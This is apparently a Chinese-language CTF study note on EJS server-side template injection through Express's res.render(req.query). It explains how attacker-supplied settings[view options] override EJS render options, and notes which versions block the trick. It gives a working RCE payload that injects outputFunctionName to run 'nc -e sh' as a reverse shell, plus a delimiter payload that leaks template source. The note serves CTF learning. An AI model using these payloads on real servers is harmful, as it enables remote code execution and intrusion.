alias:: EJS

- # SSTI
	- [[CTFWEB/SSTI/EJS]]
- # 原型链污染
	- [[CTFWEB/JS/EJS的原型链污染]]
	- [[CTFWEB/WP/CTFShow/web341]]
- # render函数传递参数导致的问题
  id:: 64d7a180-ce15-46d7-b3c5-9ae47612b34e
	- 参考
		- https://eslam.io/posts/ejs-server-side-template-injection-rce/
			- 虽然文章说只对旧版有效，但是不知道为什么``ejs@3.1.9``仍然可以使用这个漏洞实现模板泄漏
		- https://www.npmjs.com/package/ejs
			- 其中有delimiter等options的定义
	- 原理
		- 如果有形似`res.render('views/page.ejs', req.query);`的渲染方法，我们可以通过在req.query中传递恶意参数来控制ejs的渲染结果，实现RCE
		- `ejs.renderFile`会在`data`对象中看到我们的query, 然后其会根据`data.settings['view options']`拿出viewOpt合并到渲染选项中，所以我们提供viewOpt即可自定义渲染选项
	- 注意
		- 第一个参数为文件名时，express会控制ejs缓存渲染结果，所以需要在文件产生后立马发送payload，不能在访问路径，已经渲染了模板之后再发送payload
	- payload
		- RCE
			- 新版ejs会使用正则`/^[a-zA-Z_$][0-9a-zA-Z_$]*$/`检查`outputFunctionName`是否合法，不能使用这个payload
			- ```text
			  settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
			  ```
		- 查看模板
			- ```text
			  settings[view+options][delimiter]=nope114514
			  ```
-